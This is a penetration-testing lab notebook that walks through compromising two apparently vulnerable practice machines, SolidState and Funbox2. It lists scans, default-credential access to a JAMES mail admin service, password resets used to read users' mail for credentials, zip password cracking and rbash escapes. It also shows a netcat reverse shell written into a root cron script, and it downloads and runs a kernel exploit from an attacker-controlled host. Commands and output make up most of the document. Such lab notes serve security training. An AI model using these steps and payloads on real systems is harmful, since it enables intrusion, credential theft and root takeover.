
# Phase_2_prepare

172.16.33.35
172.16.33.30
172.16.33.55
172.16.33.49
172.16.33.78
172.16.33.79
172.16.33.99
172.16.33.98
172.16.33.103
172.16.33.108
172.16.33.201 (AD)

## 172.16.33.35 - SolidState

### host discovery

```bash
nmap -sn 172.16.33.0/24
```

### port scanning

```bash
nmap -p- -A 172.16.33.35

Nmap scan report for 172.16.33.35
Host is up (0.070s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (gateway [172.16.33.1])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### service enumeration

#### ssh(22) - OpenSSH 7.4p1

version > 5.x, no known vulnerabilities

#### http(80) - Apache httpd 2.4.25

##### manual enumeration

- ```webadmin@solid-state-security.com``` could be used for DNS and subdomain discovery
  - add ```solid-state-security.com, www.solid-state-security.com``` to /etc/hosts
- the function of message will send a post request to about.html, HTML is always no vuln to exploit, because it is a static page
  - ```<form method="post" action="#">```
- robots.txt, sitemap.xml
- admin, login
- wappalyzer
- view page source
  - annotation, comment, hidden information
  - link path, script, hidden element
  - Copyright, author, version

##### automated enumeration

```bash
dirsearch -u http://172.16.33.35
dirsearch -u http://172.16.33.35 -w /usr/share/seclists/Discovery/Web-Content/big.txt
dirsearch -u http://172.16.33.35 -f -e php,asp,aspx,jsp,html,txt,zip
```

#### smtp(25, 110, 119 4555) - JAMES smtpd 2.3.2

##### searchsploit

```bash
searchsploit James
searchsploit -m 35513
```

actually, the poc is used username and password root/root to add a new user.
we also can use root/root to login JAMES Remote Admin which port is 4555.

##### login JAMES Remote Admin

after login, we can update the user's password.

```bash
nc -nv 172.16.33.35 4555

listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin

setpassword mindy 123
Password for mindy reset
```

##### login JAMES pop3d

and then use the new password to login JAMES pop3d which port is 110, and view the email.
after login, and then retr the email, we can get the ssh username and password.

```bash
nc -nv 172.16.33.35 110 -C

+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass 123
+OK Welcome mindy

list
+OK 2 1945
1 1109
2 836

retr 2
+OK Message follows
username: mindy
pass: P@55W0rd1!2@
```

### priviledge escalation

#### rbash bypass

```bash
ssh mindy@172.16.33.35 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/bash\")'"
P@55W0rd1!2@
```

#### full pty

```bash
bash

stty -a
speed 38400 baud; rows 48; columns 176; line = 0;

control + z
stty raw -echo
fg
```

if use rbash bypass to get a ssh shell, we get a full pty now!!! and don't need to use the following command.

```bash
export SHELL=bash
export TERM=xterm
stty rows 48 columns 176
```

#### information gathering

```bash
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)

sudo -l
bash: sudo: command not found

uname -a
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux

find / -type f -user root -perm -o=w 2>/dev/null | grep -v 'proc\|sys'
/opt/tmp.py

ls -l /opt/tmp.py
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py

cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

the script is used to delete all files in /tmp, and it is owned by root, and it is writable.
it looks like the script is used to clean the /tmp directory regularly, and it is a good place to put a reverse shell.

#### reverse shell

```bash
#!/usr/bin/env python
import os
import sys
try:
  os.system('rm -r /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.153 4444 >/tmp/f')
except:
  sys.exit()
```

#### dirtypipe

<https://haxx.in/files/dirtypipez.c>

## 172.16.33.30 - FUNBOX: ROOKIE

### reference

<https://infosecwriteups.com/funbox-2-walkthrough-vulnhub-b1933209acf3>

### namp

```bash
nmap -sV -sC -A -p- -o ./nmap/sr 172.16.33.30

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-28 22:15 CST
Nmap scan report for 172.16.33.30
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.60 seconds
```

### ftp

```bash
└─$ ftp  
ftp> open 172.16.33.30
Connected to 172.16.33.30.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.16.33.30]
Name (172.16.33.30:parallels): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@_gateway !
230-
230-The local time is: Wed Nov 16 13:41:59 2022
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -a
229 Entering Extended Passive Mode (|||61904|)                                        
150 Opening ASCII mode data connection for file list                                  
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .                              
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..                             
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip                        
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip                   
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip                    
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip                     
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip                        
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users                        
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg                    
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip                     
226 Transfer complete  

ftp> get tom.zip
local: tom.zip remote: tom.zip
229 Entering Extended Passive Mode (|||51450|)
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
100% |*****************************************|  1477       37.06 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.04 KiB/s)
ftp> 
```

### zip

```bash
zip2john tom.zip > tom.hash
john tom.hash -w=/usr/share/wordlists/rockyou.txt
john tom.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE 2/3 (2024-01-28 22:54) 100.0g/s 5509Kp/s 5509Kc/s 5509KC/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

john tom.hash --show
tom.zip/id_rsa:iubire:id_rsa:tom.zip::tom.zip
1 password hash cracked, 0 left
```

### ssh

```bash
ssh -i tom_id_rsa tom@172.16.33.30
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
tom@funbox2:~$ pwd
/home/tom
tom@funbox2:~$ cd /
-rbash: cd: restricted
```

#### rbash bypass

##### bash -i

##### vim

:set shell=/bin/bash
:shell

##### python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### priviledge escalation

#### mysql_history

```bash
tom@funbox2:/$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

tom@funbox2:~$ ls -al
total 48
drwxr-xr-x 5 tom  tom  4096 Nov 16 13:27 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom   165 Nov 16 13:27 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Jul 25  2020 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
-rw------- 1 tom  tom    12 Nov 16 13:27 .python_history
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
-rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful
-rw------- 1 tom  tom   648 Nov 16 13:27 .viminfo

tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit

tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$ sudo -s
root@funbox2:~# 

```

#### CVE-2021-3493

##### exp_prepare

```bash
git clone https://github.com/briskets/CVE-2021-3493.git
cd CVE-2021-3493
x86_64-linux-gnu-gcc exploit.c -o exp --static
md5sum exp   
5f008b8d724985a0ef2bb9b85bd1959f  exp
```

##### exp_run

```bash
tom@funbox2:/$ uname -a
Linux funbox2 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
wget http://10.8.0.153/exp
tom@funbox2:~$ wget http://10.8.0.153/exp
tom@funbox2:~$ chmod +x exp
tom@funbox2:~$ ./exp
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(tom)
bash-4.4# 
```

### flag

```bash
root@funbox2:/root# cat flag.txt 
   ____  __  __   _  __   ___   ____    _  __             ___ 
  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
 / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/ 
/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ 
           ____ ___  ___  / /_ ___  ___/ /       / /          
 _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           
(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            
                                                              
from @0815R2d2 with ♥
```

## 172.16.33.78
